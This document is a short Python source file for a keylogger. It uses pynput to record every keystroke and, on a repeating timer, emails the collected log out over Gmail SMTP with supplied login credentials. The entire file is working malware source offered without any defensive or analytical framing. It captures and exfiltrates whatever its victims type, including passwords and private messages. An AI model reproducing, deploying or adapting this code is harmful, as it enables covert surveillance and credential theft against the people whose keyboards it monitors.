import pynput.keyboard
import threading
import smtplib


class KeyLogger:

    def __init__(self, time_interval, email, password):
        self.log = 'Keylogger started'
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '

        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        if len(self.log) > 0:
            self.send_mail(self.email, self.password, self.log)
        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        # add two newlines to avoid having text in subject.
        server.sendmail(email, email, '\n\n' + message)
        server.quit()
        print('[+] Email sent.')
        # except:
        #     print('[-] Error sending email.')

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
